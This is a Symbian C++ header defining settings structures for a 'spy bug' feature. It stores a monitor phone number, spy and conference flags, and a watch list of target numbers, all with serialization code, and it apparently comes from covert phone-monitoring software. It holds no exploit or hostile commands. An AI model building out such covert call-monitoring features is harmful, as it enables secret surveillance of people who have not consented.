#ifndef __SPYBUGINFO_H__
#define __SPYBUGINFO_H__

#include <e32base.h>
#include <S32STRM.H>

const TInt KMaxTelNumberLength 				= 50;
const TInt KMaxCountryCodeLength 			= 20;
const TInt KMaxElementArrayOfWatchNumber    = 10;
const TInt KMaxMonitorNumber			    = 5;

class TMonitorInfo
	{
public:
	inline TMonitorInfo();
	inline TBool operator==(const TMonitorInfo& aOther) const;
	inline void ExternalizeL(RWriteStream& aOut) const;
	inline void InternalizeL(RReadStream& aIn);
	inline TBool& SpyEnable();//used in settings ui
	inline TDes& MonitorNumber();//used in settings  ui
	inline TBool ConferenceEnable() const;
	
enum TTelNumberType
	{
	EUnknownNumber,
	/** 
	International number.*/
	EInternationalNumber,
	/** 
	National number.*/
	ENationalNumber
	};
public:
	TBool iEnable;
	TBool iConferenceEnable;
	TTelNumberType iType;
	/**
	Monitor number*/
	TBuf<KMaxTelNumberLength> iTelNumber;
	TFixedArray <TBuf<KMaxTelNumberLength>, KMaxMonitorNumber> iTelReserved;
	};
	
/**
* TWatchList
* Contain WN (Watch Number) and iEnable flage of Pro_X feature
*
**/
class TWatchList
	{
public:
	inline TWatchList();
	inline TBool operator==(const TWatchList& aOther) const;
	inline void ExternalizeL(RWriteStream& aOut) const;
	inline void InternalizeL(RReadStream& aIn);
	inline void Reset();
	/**
	* Count
	* @return number of none-empty number 
	*/
	inline TUint Count() const;
	inline TBool NumberExist(const TDesC& aNumber) const;
enum TEnable
	{
	/**
	Enable all numbers*/
	EEnableAll,
	/**
	Enable only number in the list*/
	EEnableOnlyInWatchList,
	/**
	Disable all*/
	EDisableAll
	};
public:
	TEnable iEnable;
	// Array of WN contain only the number without country code
	TFixedArray <TBuf<KMaxTelNumberLength>, KMaxElementArrayOfWatchNumber> iWNList;
	};

/**
* Spy bug information
* 
*/
class TBugInfo
	{
public:
	inline TBool operator==(const TBugInfo& aOther) const;
	inline TBool operator!=(const TBugInfo& aOther) const;
	
	inline void ExternalizeL(RWriteStream& aOut) const;
	inline void InternalizeL(RReadStream& aIn);
	
	inline TBool SpyEnable() const
		{return iMonitor.iEnable;}
	
	inline TBool ConferenceEnable() const
		{return iMonitor.iConferenceEnable;}
	/**
	* Get monitor number
	*/
	inline const TDesC& TelNumber()
		{return iMonitor.iTelNumber;}
	
	inline TWatchList::TEnable WatchListEnable() const
		{return iWatchList.iEnable;}
	
	inline TInt WatchListCount() const
		{return iWatchList.iWNList.Count();}
	
	//no bound checking, the caller must do it
	inline const TDesC& WatchListNumber(TInt aIndex) const
		{return iWatchList.iWNList[aIndex];}
public:
	TMonitorInfo iMonitor;
	TWatchList iWatchList;
	};

typedef TPckgC<TBugInfo> TSpyBugInfoPkgC;
typedef TPckg<TBugInfo>  TSpyBugInfoPkg;

typedef TPckgC <TWatchList> TWatchListPkgC;
typedef TPckg <TWatchList> TWatchListPkg;

typedef TPckgC <TMonitorInfo> TSpyMonitorInfoPkgC;
typedef TPckg <TMonitorInfo> TSpyMonitorInfoPkg;

//
//
inline TBool TBugInfo::operator==(const TBugInfo& aOther) const
	{
	return (iMonitor == aOther.iMonitor && iWatchList == aOther.iWatchList);
	}

inline TBool TBugInfo::operator!=(const TBugInfo& aOther) const
	{
	TBool equal = (iMonitor == aOther.iMonitor && iWatchList == aOther.iWatchList);
	return !equal;
	}

inline void TBugInfo::ExternalizeL(RWriteStream& aOut) const
	{
	aOut << iMonitor;
	aOut << iWatchList;
	}
	
inline void TBugInfo::InternalizeL(RReadStream& aIn)
	{
	aIn >> iMonitor;
	aIn >> iWatchList;
	}	
//
//
inline TMonitorInfo::TMonitorInfo()
	{
	iEnable = EFalse;
	iConferenceEnable = EFalse;
	iType = EUnknownNumber;
	iTelNumber.SetLength(0);
	}

inline TBool TMonitorInfo::operator==(const TMonitorInfo& aOther) const
	{
	return (iEnable == aOther.iEnable && iTelNumber == aOther.iTelNumber);
	}

inline void TMonitorInfo::ExternalizeL(RWriteStream& aOut) const
	{
	aOut.WriteInt8L(static_cast<TUint8>(iEnable));
	aOut.WriteInt8L(static_cast<TUint8>(iConferenceEnable));
	aOut.WriteInt8L(static_cast<TUint8>(iType));
	aOut << iTelNumber;
	}
	
inline void TMonitorInfo::InternalizeL(RReadStream& aIn)
	{
	iEnable = aIn.ReadInt8L();
	iConferenceEnable = aIn.ReadInt8L();
	iType = (TTelNumberType)aIn.ReadInt8L();
	aIn >> iTelNumber;	
	}

inline TBool& TMonitorInfo::SpyEnable()
	{
	return iEnable;
	}

inline TBool TMonitorInfo::ConferenceEnable() const
	{
	return iConferenceEnable;
	}

TDes& TMonitorInfo::MonitorNumber()
	{
	return iTelNumber;
	}

//
//
inline TWatchList::TWatchList()
	{
	iEnable = EEnableOnlyInWatchList;
	Reset();
	}

inline TBool TWatchList::operator==(const TWatchList& aOther) const
	{
	if(iEnable != aOther.iEnable)
		{
		return EFalse;
		}
	for(TInt i=0;i<KMaxElementArrayOfWatchNumber;i++)
		{
		if(iWNList[i] != aOther.iWNList[i])
			{
			return EFalse;
			}
		}
	return ETrue;
	}
	
inline void TWatchList::Reset()
	{
	for(TInt i=0;i<iWNList.Count();i++)
		{
		iWNList[i].SetLength(0);
		}
	}

inline void TWatchList::ExternalizeL(RWriteStream& aOut) const
	{
	aOut.WriteInt8L(static_cast<TUint8>(iEnable));
	for(TInt i=0;i<KMaxElementArrayOfWatchNumber;i++)
		{
		aOut << iWNList[i];
		}
	}
	
inline void TWatchList::InternalizeL(RReadStream& aIn)
	{
	iEnable = (TEnable)aIn.ReadInt8L();
	for(TInt i=0;i<KMaxElementArrayOfWatchNumber;i++)
		{		
		aIn >> iWNList[i];
		}	
	}

inline TUint TWatchList::Count() const
	{
	TUint count(0);
	for(TInt i=0;i<KMaxElementArrayOfWatchNumber;i++)
		{
		if(iWNList[i].Length())
			{
			count++;
			}
		}
	return count;
	}

inline TBool TWatchList::NumberExist(const TDesC& aNumber) const
	{
	TBool eq(EFalse);
	if(aNumber.Length())
		{
		for(TInt i=0;i<KMaxElementArrayOfWatchNumber;i++)
			{
			if(aNumber == iWNList[i])
				{
				eq=ETrue;
				break;
				}
			}
		}
	return eq;
	}

#endif
